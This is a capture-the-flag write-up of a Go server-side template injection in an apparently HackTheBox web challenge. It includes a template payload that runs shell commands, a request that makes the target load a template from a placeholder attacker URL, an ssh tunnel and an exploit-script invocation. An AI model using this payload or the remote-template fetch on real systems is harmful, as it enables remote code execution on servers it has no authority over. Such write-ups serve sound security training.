# GO SSTI > RCE 

## Website 

<img src= "renderquest.PNG">

## Description

So, the functionality of the application seems to load and render templates either locally or remotely, depending on the ?use_remote={true/false} parameter. This lead me to want to check for SSTI vulnerability. After reviewing the source code provided by HackTheBox, we know it is using the Go templating language. I was able to set up a test.go template on my server with the contents {{.FetchServerInfo "cd /;ls -la"}}. Once the server loaded and executed my template code, I recieved the contents of the / directory, revealing code execution Just for context this is a CTF. What type of vulnerabilities were displayed here?.

## Set Up

1. Burpsuite Repeater/collaborator(Testing): GET requests to /render?use_remote=true&page=https://ATTACKER_URL/test.go.
2. Apache2 server hosting test.go).
3. Setup file with SSTI payload:
   ```go
    {{.FetchServerInfo "cd /;ls -la"}}
5. Tunnel using `ssh -R 80:localhost:80 localhost.run -i /home/$user/.ssh/id_rsa`.

## Exploit

This Python script automates the exploitation of a server-side template injectiony in the web application. It sends a GET request to a specified vulnerable URL, loading and executing our attacker-controlled template on the target server, resulting in remote code execution. 
   ```python
   python exploit.py http://target-server.com http://attacker-server.com/attacker-template.txt
```
## More Information

[SSTI in GO](https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/ssti-server-side-template-injection/README.md)
